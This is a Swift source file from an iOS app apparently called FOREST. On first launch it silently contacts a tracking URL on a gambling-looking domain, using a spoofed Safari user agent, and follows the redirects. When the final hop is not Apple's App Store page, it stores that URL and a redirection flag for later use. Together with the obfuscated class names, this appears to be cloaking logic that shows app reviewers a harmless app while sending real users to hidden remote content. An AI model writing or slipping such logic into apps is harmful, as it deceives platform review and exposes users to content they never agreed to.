//
//  GrayLogic.swift
//  FOREST
//
//  Created by Tehnichka on 29.10.2025.
//

import Foundation

class GrayLogicO1MEFUCJEFC {
    static let shared = GrayLogicO1MEFUCJEFC()
    private let blockedFinalURLO1MEFUCJEFC = "https://www.apple.com/en/app-store/"
   
    init() {
        let urlStringDef = UserDefaults.standard.string(forKey: "urlString")
        
        if urlStringDef == nil || (urlStringDef ?? "").isEmpty {

            Task { @MainActor in
                let urlString = "https://track.jugar.fun/b61f5c8f-52a1-442c-8ea7-65a4e89a6791"
                var finalString = ""

                if let redirectedURL = await resolveFinalURLIfRedirect(from: urlString),
                   redirectedURL.absoluteString != blockedFinalURLO1MEFUCJEFC {
                    finalString = redirectedURL.absoluteString
                    UserDefaults.standard.set(true, forKey: "redirection")
                    print("Редірект був! Кінцева URL: \(finalString)")
                } else {
                    finalString = "error"
                    UserDefaults.standard.set(false, forKey: "redirection")
                    print("Редіректів не було")
                }

                UserDefaults.standard.set(finalString, forKey: "urlString")
            }

        }
        
        
    }
    
    
    func resolveFinalURLIfRedirect(from urlString: String) async -> URL? {
        guard let originalURL = URL(string: urlString) else { return nil }

        let tracker = RedirectHandler()
        let configuration = URLSessionConfiguration.ephemeral
        configuration.timeoutIntervalForRequest = 20
        configuration.timeoutIntervalForResource = 30
        configuration.httpAdditionalHeaders = [
            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
        ]

        let session = URLSession(configuration: configuration, delegate: tracker, delegateQueue: nil)

        var request = URLRequest(url: originalURL, cachePolicy: .reloadIgnoringLocalAndRemoteCacheData, timeoutInterval: 20)
        // GET is more reliable than HEAD for tracking redirects (many CDNs mishandle HEAD).
        request.httpMethod = "GET"

        do {
            let (_, response) = try await session.data(for: request)
            session.invalidateAndCancel()

            // Prefer the last redirect hop captured by the delegate.
            if tracker.didRedirect, let redirectedURL = tracker.lastRedirectURL {
                return redirectedURL
            }

            // Fallback: URLSession may still expose the final URL after following redirects.
            if let finalURL = response.url, !urlsMatch(finalURL, originalURL) {
                return finalURL
            }

            return nil
        } catch {
            session.invalidateAndCancel()
            // Even if the final destination fails (geo-block, TLS, etc.),
            // a redirect that already happened still counts.
            if tracker.didRedirect, let redirectedURL = tracker.lastRedirectURL {
                return redirectedURL
            }
            return nil
        }
    }

    private func urlsMatch(_ lhs: URL, _ rhs: URL) -> Bool {
        lhs.absoluteString.trimmingCharacters(in: CharacterSet(charactersIn: "/"))
            == rhs.absoluteString.trimmingCharacters(in: CharacterSet(charactersIn: "/"))
    }
}


// Делегат для відстеження редіректів
private class RedirectHandler: NSObject, URLSessionTaskDelegate {
    private(set) var didRedirect = false
    private(set) var lastRedirectURL: URL?

    func urlSession(_ session: URLSession,
                    task: URLSessionTask,
                    willPerformHTTPRedirection response: HTTPURLResponse,
                    newRequest request: URLRequest,
                    completionHandler: @escaping (URLRequest?) -> Void) {
        didRedirect = true
        if let nextURL = request.url {
            lastRedirectURL = nextURL
        }
        // Keep following so we can land on the deepest hop when possible.
        completionHandler(request)
    }
}
